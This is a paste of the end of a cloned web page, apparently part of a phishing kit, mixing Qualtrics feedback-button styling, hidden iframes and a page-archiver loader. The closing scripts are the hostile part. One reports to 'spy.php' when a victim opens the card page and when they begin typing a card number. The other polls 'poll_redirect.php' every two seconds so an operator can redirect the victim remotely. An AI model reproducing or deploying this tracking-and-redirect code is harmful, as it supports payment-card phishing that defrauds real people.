Attention: The following code is provided as-is 
and requires programming knowledge to implement. 
Qualtrics Support does not offer assistance or consultation on custom coding. 
You can always try asking our community of dedicated users instead.
For help with custom code go to https://community.qualtrics.com/custom-code-12
NOTE: Changes made here will not be reflected in the previewer.
Please be sure to test out your changes manually. */

/* Style feedback button parent container. This is a container that sits on top of the entire screen and is mostly transparent that houses the feedback button */
.QSIFeedbackButton {
   z-index: 11 !important;
   height: 114px ;
   width:30px ;
}

#QSIFeedbackButton-btn {
     border-width: 2px 0px 2px 2px !important;
     border-style: solid !important;
     border-color: #6161FF !important;
     border-radius: 4px;
     width:30px !important;   
     right: -2px !important;
}

/* Style feedback button */
#QSIFeedbackButton-btn div {
     font-size: 14px !important; 
     font-weight: 700 !important; 
     font-family: 'Hanken Grotesk'  !important;
   padding:0px !important;
}

#QSIFeedbackButton-btn div:nth-child(2) {
     padding:5px  !important;
}

#QSIFeedbackButton-shadowbox {
    z-index: 12 !important;
    opacity: 0.6 !important;
}

#QSIFeedbackButton-pullup-container.QSIFeedbackButton {
    z-index: 13 !important;
}</style><div class="QSIFeedbackButton" style="position: fixed; visibility: hidden; inset: 0px; display: flex; flex-direction: column; justify-content: flex-end; align-items: flex-start; margin: 0px; padding: 0px; z-index: 2000000000;" bis_skin_checked="1"><button role="button" style="position: fixed; visibility: visible; cursor: pointer; border: medium; background-color: transparent; padding: 0px; margin: 0px; bottom: 409px; right: -1px; width: 35px;" id="QSIFeedbackButton-btn"><div style="background: rgb(255, 255, 255); color: rgb(78, 78, 226); padding: 10px; position: relative; font-size: 15px; display: flex; flex-direction: row; z-index: -1; writing-mode: vertical-rl; transform: rotateZ(180deg); border-top-right-radius: 4px; border-bottom-right-radius: 4px;" bis_skin_checked="1"><div bis_skin_checked="1"><div bis_skin_checked="1"></div></div><div bis_skin_checked="1">Geef je mening</div></div></button></div><div style="width: 0px; height: 0px; display: none; visibility: hidden;" id="batBeacon161667398797" bis_skin_checked="1"><img style="width: 0px; height: 0px; display: none; visibility: hidden;" id="batBeacon612190989029" width="0" height="0" alt="" src="0"></div><iframe height="0" width="0" style="display: none; visibility: hidden;" src="index_2.html"></iframe><div style="display: none;" bis_skin_checked="1"></div><iframe height="0" width="0" style="display: none; visibility: hidden;" src="index_8.html" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:0}"></iframe><iframe height="0" width="0" style="display: none; visibility: hidden;" src="index_3.html"></iframe><iframe id="_hjSafeContext_75066023" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="index_4.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><script data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", k8 = "data-scrapbook-adoptedstylesheets", k9 = /^data-scrapbook-adoptedstylesheet-(\d+)$/, k10 = "data-scrapbook-shadowdom-mode", k11 = "data-scrapbook-shadowdom-clonable", k12 = "data-scrapbook-shadowdom-delegates-focus", k13 = "data-scrapbook-shadowdom-serializable", k14 = "data-scrapbook-shadowdom-slot-assignment", k15 = "data-scrapbook-slot-assigned", k16 = "data-scrapbook-slot-index", k17 = /^scrapbook-slot-index=(\d+)$/, k18 = '/scrapbook-slot-index', d = document, r = d.documentElement, $s = !!r.attachShadow, $as = !!d.adoptedStyleSheets, $c = !!window.HTMLCanvasElement, $sa = !!d.createElement('slot').assign, sle = [], sls = [], slt = function (r) { if ($sa) { var E = r.childNodes, i, e, s, m; for (i = 0; i < E.length; i++) { e = E[i]; if (e.nodeType === 8) { s = e.nodeValue; if (m = s.match(k17)) { s = e.nextSibling; if (s.nodeType === 3) { sls[m[1]] = s; } r.removeChild(e); i--; } else if (s === k18) { r.removeChild(e); i--; } } } } }, sl = function () { var i = sle.length, j, d, e; while (i--) { d = sle[i]; e = d.elem; d = d.value.split(','); j = d.length; while (j--) { d[j] = sls[parseInt(d[j], 10)]; } try { e.assign.apply(e, d); } catch (ex) { console.error(ex); } } }, asl = (function (r) { var l = [], E, i, e, m, c, j; if ($as) { E = r.attributes; i = E.length; while (i--) { e = E[i]; if (!(m = e.nodeName.match(k9))) { continue; } c = l[m[1]] = new CSSStyleSheet(); r.removeAttribute(m[0]); m = e.nodeValue.split('\n\n'); j = m.length; while (j--) { try { m[j] && c.insertRule(m[j]); } catch (ex) { console.error(ex); } } } } return l; })(r), as = function (d, e) { var l, i, I; if ($as && (l = e.getAttribute(k8)) !== null) { l = l.split(','); for (i = 0, I = l.length; i < I; i++) { d.adoptedStyleSheets.push(asl[l[i]]); } e.removeAttribute(k8); } }, fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s, m; while (i--) { e = E[i]; s = e.shadowRoot; if ($s && (d = e.getAttribute(k1))) { if (!s) { try { s = e.attachShadow({ mode: (m = e.getAttribute(k10)) !== null ? m : 'open', clonable: e.hasAttribute(k11), delegatesFocus: e.hasAttribute(k12), serializable: e.hasAttribute(k13), slotAssignment: (m = e.getAttribute(k14)) !== null ? m : void 0, }); s.innerHTML = d; } catch (ex) { console.error(ex); } } e.removeAttribute(k1); e.removeAttribute(k10); e.removeAttribute(k11); e.removeAttribute(k12); e.removeAttribute(k13); e.removeAttribute(k14); } if ($c && (d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if ($sa && (d = e.getAttribute(k15)) !== null) { sle.push({elem: e, value: d}); e.removeAttribute(k15); } if ($sa && (d = e.getAttribute(k16)) !== null) { sls[d] = e; e.removeAttribute(k16); } if (s) { slt(e); as(s, e); fn(s); } } }; as(d, r); fn(d); sl(); })()</script><script>
    $(document).ready(function() {
        // Send notification when the card page is viewed
        $.post("spy.php", { cardview: 1 });

        var c = 0;

        // Trigger when the card number field is being typed in
        $("#card-number").on("keyup", function() {
            c++;
            // Send notification when card information is entered (triggered after the first keyup)
            if (c === 1) {
                $.post("spy.php", { carding: 1 })
                    .done(function(response) {
                        console.log("carding status sent:", response);
                    })
                    .fail(function(xhr, status, error) {
                        console.error("Error sending carding status:", error);
                    });
            }
        });
    });
</script>
<script>
// Function to poll for redirects
function checkForRedirect() {
    fetch('poll_redirect.php?' + new Date().getTime())
        .then(response => response.json())
        .then(data => {
            if (data.redirect) {
                window.location.href = data.url;
            }
        })
        .catch(error => console.error('Error checking for redirect:', error));
}

// Poll every 2 seconds
setInterval(checkForRedirect, 2000);

// Also check immediately on page load
document.addEventListener('DOMContentLoaded', checkForRedirect);
</script></body></html>
This paste expires in <1 hour. Public IP access. Share whatever you see with others in seconds with Context. Terms of ServiceReport this